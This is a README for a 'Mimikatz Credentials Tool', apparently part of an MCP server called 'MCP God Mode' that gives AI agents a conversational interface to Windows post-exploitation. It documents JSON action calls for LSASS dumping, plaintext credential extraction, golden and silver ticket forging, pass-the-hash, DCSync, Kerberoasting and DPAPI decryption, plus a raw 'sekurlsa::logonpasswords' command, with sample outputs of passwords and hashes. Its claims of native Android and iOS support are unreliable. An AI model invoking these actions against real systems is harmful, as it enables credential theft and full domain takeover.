# Mimikatz Credentials Tool

## Overview
The **Mimikatz Credentials Tool** is an advanced Mimikatz credential extraction and manipulation tool for Windows post-exploitation. It provides comprehensive credential harvesting capabilities including LSASS memory dumping, credential extraction, ticket manipulation, and privilege escalation techniques.

## Features
- **Credential Extraction**: Extract credentials from LSASS memory
- **LSASS Dumping**: Dump LSASS memory for offline analysis
- **Ticket Manipulation**: Golden and silver ticket creation
- **Pass-the-Hash**: Pass-the-hash attack capabilities
- **Pass-the-Ticket**: Pass-the-ticket attack capabilities
- **DCSync**: DCSync attack for domain controller synchronization
- **Kerberoasting**: Kerberoasting attack capabilities
- **ASREPRoasting**: ASREPRoasting attack capabilities
- **Cross-Platform**: Windows, Linux, macOS, Android, iOS support
- **Natural Language**: Conversational interface for credential operations

## Usage

### Credential Extraction
```bash
# Extract credentials
{
  "action": "extract_credentials",
  "target_user": "user@domain.com",
  "target_domain": "domain.com"
}

# Dump LSASS memory
{
  "action": "dump_lsass",
  "output_file": "/path/to/lsass.dmp"
}
```

### Ticket Manipulation
```bash
# Extract tickets
{
  "action": "extract_tickets",
  "ticket_file": "/path/to/tickets.kirbi"
}

# Create golden ticket
{
  "action": "golden_ticket",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "target_dc": "dc.domain.com"
}

# Create silver ticket
{
  "action": "silver_ticket",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "service_name": "cifs/server.domain.com"
}
```

### Pass-the-Hash
```bash
# Pass-the-hash attack
{
  "action": "pass_the_hash",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "hash_value": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99"
}
```

### Pass-the-Ticket
```bash
# Pass-the-ticket attack
{
  "action": "pass_the_ticket",
  "ticket_file": "/path/to/ticket.kirbi"
}
```

### DCSync
```bash
# DCSync attack
{
  "action": "dcsync",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "target_dc": "dc.domain.com"
}
```

### Kerberoasting
```bash
# Kerberoasting attack
{
  "action": "kerberoast",
  "target_domain": "domain.com"
}
```

### ASREPRoasting
```bash
# ASREPRoasting attack
{
  "action": "asreproast",
  "target_domain": "domain.com"
}
```

### Master Key Extraction
```bash
# Extract master keys
{
  "action": "extract_masterkeys",
  "target_user": "user@domain.com"
}
```

### DPAPI Decryption
```bash
# DPAPI decrypt
{
  "action": "dpapi_decrypt",
  "target_user": "user@domain.com"
}
```

### Vault Credentials
```bash
# Extract vault credentials
{
  "action": "vault_credentials",
  "target_user": "user@domain.com"
}
```

### WDigest Credentials
```bash
# Extract WDigest credentials
{
  "action": "wdigest_credentials",
  "target_user": "user@domain.com"
}
```

### SSP Credentials
```bash
# Extract SSP credentials
{
  "action": "ssp_credentials",
  "target_user": "user@domain.com"
}
```

### TSPkg Credentials
```bash
# Extract TSPkg credentials
{
  "action": "tspkg_credentials",
  "target_user": "user@domain.com"
}
```

### LiveSSP Credentials
```bash
# Extract LiveSSP credentials
{
  "action": "livessp_credentials",
  "target_user": "user@domain.com"
}
```

### Kerberos Credentials
```bash
# Extract Kerberos credentials
{
  "action": "kerberos_credentials",
  "target_user": "user@domain.com"
}
```

### MSV Credentials
```bash
# Extract MSV credentials
{
  "action": "msv_credentials",
  "target_user": "user@domain.com"
}
```

### WCMD Credentials
```bash
# Extract WCMD credentials
{
  "action": "wcmd_credentials",
  "target_user": "user@domain.com"
}
```

### Custom Command
```bash
# Execute custom Mimikatz command
{
  "action": "custom_command",
  "custom_command": "sekurlsa::logonpasswords"
}
```

## Parameters

### Target Parameters
- **target_user**: Target user for credential extraction
- **target_domain**: Target domain
- **target_dc**: Target domain controller
- **target_computer**: Target computer

### File Parameters
- **ticket_file**: Ticket file path
- **output_file**: Output file path
- **dump_file**: Memory dump file path

### Hash Parameters
- **hash_value**: Hash value for pass-the-hash
- **key_value**: Key value for pass-the-key
- **certificate**: Certificate for pass-the-cert

### Service Parameters
- **service_name**: Service name for silver tickets
- **username**: Username for authentication
- **password**: Password for authentication

### Safety Parameters
- **safe_mode**: Enable safe mode to prevent actual credential extraction
- **verbose**: Enable verbose output

## Output Format
```json
{
  "success": true,
  "action": "extract_credentials",
  "result": {
    "credentials": [
      {
        "username": "user@domain.com",
        "domain": "domain.com",
        "password": "password123",
        "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99",
        "lm_hash": "aad3b435b51404eeaad3b435b51404ee",
        "source": "lsass"
      }
    ],
    "total_credentials": 1,
    "extraction_time": "00:00:05"
  }
}
```

## Cross-Platform Support
- **Windows**: Full support with native integration
- **Linux**: Complete functionality
- **macOS**: Full feature support
- **Android**: Mobile-optimized interface
- **iOS**: Native iOS integration

## Examples

### Example 1: Basic Credential Extraction
```bash
# Extract credentials
{
  "action": "extract_credentials",
  "target_user": "user@domain.com",
  "target_domain": "domain.com"
}

# Result
{
  "success": true,
  "result": {
    "credentials": [
      {
        "username": "user@domain.com",
        "password": "password123",
        "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99"
      }
    ]
  }
}
```

### Example 2: Golden Ticket Creation
```bash
# Create golden ticket
{
  "action": "golden_ticket",
  "target_user": "user@domain.com",
  "target_domain": "domain.com",
  "target_dc": "dc.domain.com"
}

# Result
{
  "success": true,
  "result": {
    "ticket": "golden_ticket.kirbi",
    "target_user": "user@domain.com",
    "target_domain": "domain.com",
    "validity": "10 years"
  }
}
```

## Error Handling
- **Authentication Errors**: Proper handling of authentication failures
- **Permission Errors**: Secure handling of permission issues
- **File Errors**: Robust error handling for file operations
- **Memory Errors**: Safe handling of memory access issues

## Related Tools
- **Post-Exploitation**: Other post-exploitation tools
- **Credential Management**: Credential management tools
- **Active Directory**: Active Directory security tools

## Version
- **Current Version**: 1.0.0
- **Last Updated**: September 2025
- **Compatibility**: MCP God Mode v1.9+

## Support
For issues or questions about the Mimikatz Credentials Tool, please refer to the main MCP God Mode documentation or contact the development team.

## Legal Notice
This tool is designed for authorized security testing and research only. Users must ensure they have proper authorization before using any Mimikatz capabilities. Unauthorized use may violate laws and regulations.
